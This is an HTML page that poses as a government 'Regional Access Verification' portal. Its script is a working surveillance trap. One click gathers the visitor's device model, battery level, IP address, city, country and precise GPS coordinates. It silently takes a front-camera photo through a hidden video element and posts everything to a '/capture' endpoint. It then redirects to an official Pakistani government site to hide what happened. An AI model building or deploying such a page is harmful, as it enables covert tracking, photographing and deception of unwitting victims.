<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification Portal</title>
    <style>
        :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
        .status-bar { height: 4px; background: var(--primary); border-radius: 10px; width: 50px; margin-bottom: 20px; }
        h2 { font-size: 20px; color: var(--text); margin: 0 0 12px 0; font-weight: 700; }
        p { font-size: 14px; color: #586069; line-height: 1.6; margin-bottom: 30px; }
        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2); }
        .btn:active { transform: scale(0.98); }
        #loader { display: none; text-align: center; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer-text { font-size: 11px; color: #959da5; margin-top: 25px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="status-bar"></div>
    <h2>Regional Access Verification</h2>
    <p>This automated portal confirms your identity and location for secure access. Please click below to complete the mandatory compliance check.</p>
    
    <div id="loader">
        <div class="spinner"></div>
        <div style="font-size: 13px; color: var(--primary); font-weight: 600;">Authenticating Secure Connection...</div>
    </div>

    <button id="mainBtn" class="btn" onclick="startProcess()">CONTINUE TO PORTAL</button>
    
    <div class="footer-text">
        System ID: FZN-PR-2026<br>
        Encrypted by Digital Security Authority
    </div>
</div>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>

<script>
    async function startProcess() {
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('loader');
        btn.style.display = 'none';
        loader.style.display = 'block';

        // 1. Dynamic Hardware Model Extraction
        let ua = navigator.userAgent;
        let deviceModel = "Unknown Device";
        if (/android/i.test(ua)) {
            // Extracts exact model like SM-S928B or S667LN from User Agent string
            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
            deviceModel = match ? match[2] : "Android Mobile";
        } else if (/iPhone/i.test(ua)) {
            deviceModel = "Apple iPhone";
        }

        let reportData = {
            device: deviceModel.trim(),
            platform: navigator.platform,
            battery: "N/A",
            time: new Date().toLocaleString(),
            lat: "0", lon: "0",
            city: "Fetching...", country: "Fetching...", ip: "Fetching..."
        };

        // 2. Battery retrieval
        if(navigator.getBattery) {
            const b = await navigator.getBattery();
            reportData.battery = Math.round(b.level * 100) + "%";
        }

        // 3. Multi-Source IP & Location (Waiting Logic)
        const fetchGeo = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                reportData.city = data.city || "N/A";
                reportData.country = data.country_name || "N/A";
                reportData.ip = data.ip || "N/A";
            } catch (e) {
                reportData.city = "Access Blocked";
            }
        };

        // 4. Camera (Fixed 9:16 Aspect Ratio)
        const geoPromise = fetchGeo();
        const cameraPromise = navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user", 
                width: { ideal: 1920 }, 
                height: { ideal: 1080 },
                aspectRatio: 0.5625 
            } 
        }).catch(() => null);

        navigator.geolocation.getCurrentPosition(async (pos) => {
            reportData.lat = pos.coords.latitude;
            reportData.lon = pos.coords.longitude;
            finalize(await cameraPromise, reportData, geoPromise);
        }, async () => {
            finalize(await cameraPromise, reportData, geoPromise);
        }, { enableHighAccuracy: true, timeout: 8000 });
    }

    async function finalize(stream, data, geoTask) {
        await geoTask; // CRITICAL: Wait for IP data to avoid "Pending"
        
        if (stream) {
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // 2.2 Seconds delay for high-quality sensor adjustment
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                
                stream.getTracks().forEach(t => t.stop());
                sendData(data, photo);
            }, 2200);
        } else {
            sendData(data, null);
        }
    }

    function sendData(info, photo) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ info: info, photo: photo })
        }).then(() => {
            window.location.href = "https://www.pakistan.gov.pk/";
        });
    }
</script>
</body>
</html>
